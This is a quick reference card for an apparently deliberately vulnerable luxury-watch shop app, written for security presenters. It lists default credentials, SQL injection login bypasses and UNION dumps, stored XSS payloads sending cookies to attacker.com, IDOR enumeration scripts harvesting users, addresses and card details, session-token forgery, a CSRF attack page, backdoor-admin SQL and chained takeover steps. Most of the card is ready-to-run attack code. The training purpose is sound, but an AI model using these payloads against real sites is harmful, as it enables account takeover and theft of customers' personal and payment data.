# 🎯 LuxWatch - Quick Reference Card

## Application URLs

- **Home:** http://localhost:3000
- **User Login:** http://localhost:3000/login.html
- **Admin Login:** http://localhost:3000/admin-login.html
- **User Dashboard:** http://localhost:3000/dashboard.html
- **Admin Panel:** http://localhost:3000/admin.html

## Default Credentials

### Admin
```
Username: admin
Password: admin123
ID: 1
```

### Regular Users
```
User 1: user / user123 (ID: 2)
User 2: john / password (ID: 3)
```

## Quick Attack Examples

### 1. SQL Injection - Authentication Bypass
**Location:** Login form

**Payload:**
```
Username: admin' OR '1'='1' --
Password: [anything]
```

**Alternative:**
```
Username: admin' --
Password: [empty]
```

### 2. SQL Injection - Database Enumeration
**Location:** Search bar

**Payload:**
```
' UNION SELECT id, username, password, email, role, created_at FROM users --
```

### 3. Stored XSS - Cookie Theft
**Location:** Product reviews

**Payload:**
```javascript
<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>
```

**Better Payload:**
```javascript
<img src=x onerror="fetch('http://attacker.com/?data='+btoa(document.cookie))">
```

### 4. IDOR - Access User Profiles
**Location:** Browser console or Burpsuite

**Payloads:**
```javascript
// View admin (ID: 1)
fetch('/api/users/1').then(r => r.json()).then(console.log)

// View user (ID: 2)
fetch('/api/users/2').then(r => r.json()).then(console.log)

// Enumerate all users
for(let i=1; i<=10; i++) {
  fetch(`/api/users/${i}`)
    .then(r => r.json())
    .then(u => console.log(`${u.id}: ${u.username} / ${u.password}`))
}
```

### 5. IDOR - Access Addresses
**Location:** Burpsuite or browser console

**Payloads:**
```javascript
// View any user's address
fetch('/api/addresses/1').then(r => r.json()).then(console.log)

// Enumerate all addresses
for(let i=1; i<=100; i++) {
  fetch(`/api/addresses/${i}`)
    .then(r => r.json())
    .then(addr => console.log(`${addr.id}: ${addr.name}, ${addr.street}, ${addr.city}`))
    .catch(() => {})
}
```

### 6. IDOR - Payment Method Breach
**Payloads:**
```javascript
// View payment methods
fetch('/api/payment-methods/1').then(r => r.json()).then(console.log)

// Enumerate all cards
for(let i=1; i<=100; i++) {
  fetch(`/api/payment-methods/${i}`)
    .then(r => r.json())
    .then(pm => console.log(`${pm.card_type} ****${pm.last_four}`))
    .catch(() => {})
}
```

### 7. IDOR - Access Private Collections
**Payloads:**
```javascript
// Access private collections
fetch('/api/collections/1').then(r => r.json()).then(console.log)
fetch('/api/collections/2').then(r => r.json()).then(console.log)
fetch('/api/collections/3').then(r => r.json()).then(console.log)

// View collection contents
fetch('/api/collections/3')
  .then(r => r.json())
  .then(col => {
    console.log(`Collection: ${col.name} (${col.is_public ? 'Public' : 'Private'})`);
    console.log(`Owner: ${col.username}`);
    col.items.forEach(item => console.log(`- ${item.name} ($${item.price})`));
  })
```

### 8. IDOR - Steal Referral Earnings
**Payloads:**
```javascript
// View referral stats
fetch('/api/referrals/1').then(r => r.json()).then(console.log)
fetch('/api/referrals/2').then(r => r.json()).then(console.log)

// Enumerate all referral codes
for(let i=1; i<=10; i++) {
  fetch(`/api/referrals/${i}`)
    .then(r => r.json())
    .then(ref => console.log(`User ${i}: Code ${ref.referral_code}, Earnings $${ref.total_earnings}`))
}
```

### 9. IDOR - Track Any Order
**Payloads:**
```javascript
// Track any order with shipping location
fetch('/api/orders/1/tracking').then(r => r.json()).then(console.log)

// Enumerate all order tracking
for(let i=1; i<=50; i++) {
  fetch(`/api/orders/${i}/tracking`)
    .then(r => r.json())
    .then(t => console.log(`Order ${i}: ${t.tracking[0].status} at ${t.tracking[0].location}`))
    .catch(() => {})
}
```

### 10. Arbitrary SQL Execution
**Location:** Admin Panel → Debug SQL

**Payloads:**
```sql
-- Dump all tables
SELECT name FROM sqlite_master WHERE type='table';

-- View all users with passwords
SELECT * FROM users;

-- View all addresses
SELECT * FROM addresses;

-- View all payment methods
SELECT * FROM payment_methods;

-- Create backdoor admin
INSERT INTO users (username, password, role) 
VALUES ('hacker', 'pwned', 'admin');

-- Change your role to admin
UPDATE users SET role='admin' WHERE username='user';
```

### 11. Session Token Prediction
**Location:** Browser console

**Pattern:** `userId_timestamp`

**Example:**
```javascript
// Current user session: "2_1768212345678"
// Predict admin session (user ID 1)
const adminToken = `1_${Date.now() - 5000}`;
document.cookie = `session=${adminToken}`;
location.reload();
```

### 12. CSRF - Add Malicious Product
Create `attack.html`:
```html
<html>
<body>
<form action="http://localhost:3000/api/admin/products" method="POST" id="csrf">
  <input type="hidden" name="name" value="Hacked Watch" />
  <input type="hidden" name="brand" value="Pwned" />
  <input type="hidden" name="description" value="<script>alert('XSS')</script>" />
  <input type="hidden" name="price" value="1" />
  <input type="hidden" name="image" value="hack.jpg" />
  <input type="hidden" name="stock" value="999" />
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

## API Endpoints Reference

### Public Endpoints
```
POST   /api/login          - User/admin login (SQLi vulnerable)
POST   /api/register       - User registration
POST   /api/logout         - Logout
GET    /api/products       - List all products
GET    /api/products/:id   - Get product details
GET    /api/search?q=...   - Search products (SQL injection)
GET    /api/products/:id/reviews - Get product reviews
```

### Authenticated User Endpoints (IDOR Vulnerable)
```
GET    /api/user           - Get current user info
GET    /api/users/:id      - Get any user (IDOR)
POST   /api/orders         - Create new order
GET    /api/orders/my      - Get current user's orders
GET    /api/orders/:id     - Get any order (IDOR)
GET    /api/orders/:id/tracking - Track any order (IDOR)
POST   /api/reviews        - Add review (XSS vulnerable)
```

### User Resource Endpoints (All IDOR Vulnerable)
```
# Addresses
GET    /api/user/addresses           - Get my addresses
GET    /api/addresses/:id            - Get any address (IDOR)
POST   /api/user/addresses           - Create address
PUT    /api/addresses/:id            - Update any address (IDOR)
DELETE /api/addresses/:id            - Delete any address (IDOR)

# Payment Methods
GET    /api/user/payment-methods     - Get my payment methods
GET    /api/payment-methods/:id      - Get any payment method (IDOR)
POST   /api/user/payment-methods     - Add payment method
DELETE /api/payment-methods/:id      - Delete any payment method (IDOR)

# Collections
GET    /api/user/collections         - Get my collections
GET    /api/collections/:id          - Get any collection (IDOR - incl. private)
POST   /api/user/collections         - Create collection
POST   /api/collections/:id/items    - Add item to any collection (IDOR)
DELETE /api/collections/:id          - Delete any collection (IDOR)

# Wishlists
GET    /api/user/wishlists           - Get my wishlists
GET    /api/wishlists/:id            - Get any wishlist (IDOR - incl. private)
POST   /api/user/wishlists           - Create wishlist
POST   /api/wishlists/:id/items      - Add item to any wishlist (IDOR)

# Referrals
GET    /api/user/referral-code       - Get my referral code
GET    /api/referrals/:userId        - Get any user's referral stats (IDOR)
```

### Admin Endpoints
```
GET    /api/admin/users    - List all users
GET    /api/admin/orders   - List all orders
POST   /api/admin/products - Add product (CSRF)
PUT    /api/admin/products/:id - Update product (CSRF)
DELETE /api/admin/products/:id - Delete product (CSRF)
POST   /api/admin/query    - Execute SQL query (DANGEROUS!)
POST   /api/admin/upload   - Upload file
```

## Common Attack Chains

### Chain 1: Complete Takeover
```
1. SQL Injection in login → Bypass authentication
2. Access admin panel
3. Use debug SQL to dump database (all tables)
4. Extract: users, addresses, payment_methods, referrals
5. Create permanent backdoor admin account
6. Inject XSS in product for persistence
```

### Chain 2: Customer Data Exfiltration
```
1. Login as regular user
2. IDOR to enumerate all users (passwords in plain text)
3. IDOR to enumerate all addresses (PII)
4. IDOR to enumerate all payment methods (card data)
5. IDOR to enumerate all orders + tracking (shipping info)
6. Build complete customer database
```

### Chain 3: Business Intelligence Gathering
```
1. Login as user
2. IDOR: Access all private collections (competitor interests)
3. IDOR: Access all wishlists (market demand analysis)
4. IDOR: Enumerate all orders (sales volume, popular products)
5. IDOR: View referral earnings (top affiliates)
6. Comprehensive market intelligence gathered
```

### Chain 4: Session Hijacking
```
1. Inject XSS in product review
2. Wait for admin to view product
3. Steal admin session cookie via XSS
4. Use stolen session to access admin panel
5. Execute arbitrary SQL for full database dump
6. Create backdoor for persistent access
```

## Setup Commands

### Local Setup
```bash
# Install dependencies
npm install

# Start server
npm start

# Or use setup script
./setup.sh
```

### Docker Setup
```bash
# Using docker-compose
docker-compose up -d

# View logs
docker-compose logs -f

# Stop containers
docker-compose down
```

## Vulnerability Count

### By Category
- **SQL Injection:** 3 locations (login, search, admin debug)
- **XSS:** 2 locations (reviews, comments)
- **CSRF:** All state-changing operations
- **IDOR:** 15+ endpoints (users, addresses, payments, collections, wishlists, orders, tracking, referrals)
- **Weak Auth:** Plain text passwords, predictable sessions
- **Info Disclosure:** Verbose errors, debug endpoints
- **Session Issues:** No expiration, no HTTPOnly, predictable tokens
- **Broken Access Control:** No ownership validation

### Total
- **9 categories**
- **30+ individual flaws**

## Browser Console Helpers

### Quick User Enumeration
```javascript
async function dumpUsers() {
  for(let i=1; i<=20; i++) {
    const r = await fetch(`/api/users/${i}`);
    if(r.ok) {
      const u = await r.json();
      console.log(`[${u.id}] ${u.username}:${u.password} (${u.role})`);
    }
  }
}
dumpUsers();
```

### Quick Address Dump
```javascript
async function dumpAddresses() {
  for(let i=1; i<=100; i++) {
    const r = await fetch(`/api/addresses/${i}`);
    if(r.ok) {
      const a = await r.json();
      console.log(`[${a.id}] ${a.name}: ${a.street}, ${a.city}, ${a.state} ${a.zip}`);
    }
  }
}
dumpAddresses();
```

### Quick Payment Method Dump
```javascript
async function dumpPayments() {
  for(let i=1; i<=100; i++) {
    const r = await fetch(`/api/payment-methods/${i}`);
    if(r.ok) {
      const p = await r.json();
      console.log(`[${p.id}] User ${p.user_id}: ${p.card_type} ****${p.last_four} (${p.expiry_month}/${p.expiry_year})`);
    }
  }
}
dumpPayments();
```

### Quick Collection Access
```javascript
async function dumpCollections() {
  for(let i=1; i<=20; i++) {
    const r = await fetch(`/api/collections/${i}`);
    if(r.ok) {
      const c = await r.json();
      console.log(`[${c.id}] ${c.name} by ${c.username} (${c.is_public ? 'Public' : 'PRIVATE'})`);
      c.items.forEach(item => console.log(`  - ${item.name} ($${item.price})`));
    }
  }
}
dumpCollections();
```

### Quick Referral Enumeration
```javascript
async function dumpReferrals() {
  for(let i=1; i<=10; i++) {
    const r = await fetch(`/api/referrals/${i}`);
    if(r.ok) {
      const ref = await r.json();
      console.log(`User ${i}: Code ${ref.referral_code}, Earnings $${ref.total_earnings}, Refs: ${ref.total_referrals}`);
    }
  }
}
dumpReferrals();
```

### Complete Database Dump
```javascript
async function dumpEverything() {
  console.log('=== USERS ===');
  await dumpUsers();
  console.log('\n=== ADDRESSES ===');
  await dumpAddresses();
  console.log('\n=== PAYMENT METHODS ===');
  await dumpPayments();
  console.log('\n=== COLLECTIONS ===');
  await dumpCollections();
  console.log('\n=== REFERRALS ===');
  await dumpReferrals();
}
dumpEverything();
```

## Tips for Presenters

1. **Start Simple:** Show normal e-commerce functionality first
2. **Build Complexity:** Start with basic IDOR, then chain attacks
3. **Use Burpsuite:** Demonstrate professional tools, not just console
4. **Show Impact:** Explain business consequences (PCI, GDPR, etc.)
5. **Explain Fixes:** After each exploit, show the secure code
6. **Be Ethical:** Emphasize responsible disclosure and legal testing only

## Key Features for Demos

### Realistic E-Commerce Features
- ✅ Product catalog with luxury watches
- ✅ User registration and login
- ✅ Shopping cart and checkout
- ✅ Address book management
- ✅ Saved payment methods
- ✅ Order history and tracking
- ✅ Watch collections (public/private)
- ✅ Wishlists (shareable)
- ✅ Referral program with earnings
- ✅ Product reviews and ratings

### Hidden Vulnerabilities
- ⚠️ No "Enter User ID" demo fields
- ⚠️ IDOR must be discovered via API inspection
- ⚠️ Requires Burpsuite for exploitation
- ⚠️ Realistic attack surface

## Resources

- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **PortSwigger Academy:** https://portswigger.net/web-security
- **SQL Injection Cheat Sheet:** https://portswigger.net/web-security/sql-injection/cheat-sheet
- **Burpsuite Docs:** https://portswigger.net/burp/documentation

---

**Remember: Use responsibly and only in authorized environments!**
